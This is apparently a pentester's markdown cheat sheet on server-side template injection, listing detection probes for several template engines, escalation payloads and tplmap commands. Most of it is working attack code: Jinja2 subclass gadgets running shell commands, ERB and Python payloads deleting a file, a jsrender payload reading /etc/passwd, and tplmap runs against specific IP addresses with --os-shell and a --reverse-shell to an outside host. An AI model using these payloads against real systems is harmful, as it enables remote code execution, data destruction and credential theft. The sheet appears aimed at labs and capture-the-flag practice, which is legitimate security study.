# Detection
```bash
{{7*7}}                # Jinja2 or Twig
{{7*'7'}}              # 7777777 in Jinja - 49 in Twig
${7*7}                 # Smarty or Mako
<%= 7*7 %>             # Embedded Ruby template (ERB)
${{7*7}}
#{7*7}
${{<%[%'"}}%\
{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]
```

# Escalate
- Jinja2/Flask
  - Fuzz for `414` to find true `subclass` number. 
  ```html
  {{config.items()}}
  {{''.__class__.mro()[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
  ```
- Ruby Command Injection
  ```bash
  <%= system("rm /home/carlos/morale.txt") %>      
  https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
  ```
- Python Command Injection
  ```bash
  {% import os %}
  {{os.system('rm /home/carlos/morale.txt')
  blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')       # Escape the context by }}
  ```
- System Access via Python Code
  ```bash
  GET /display_name?name="{{__import__('os').system('ls')}}"
  Host: example.com
  ```
- Escaping the Sandbox by Python Built-in Functions.
  ```bash
  GET /display_name?name="{{[].__class__.__bases__[0].__subclasses__()}}"         # Lists the Python classes available
  Host: example.com
  ```
- jsrender/Expressjs
  ```javascritp
  {{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
  ```

# TplMap
```bash
python2 tplmap.py -u "http://77.238.121.150:54041"
python2 tplmap.py -u "http://77.238.121.150:54041" --os-shell
python2 tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -X POST -d nickname=a --os-shell
python2 tplmap.py -u http://77.238.121.150:54041 -X POST -d name=a --reverse-shell cvefix.ir 12345
```

# Resource
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://github.com/carlospolop/hacktricks/tree/master/pentesting-web/ssti-server-side-template-injection
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://portswigger.net/research/server-side-template-injection

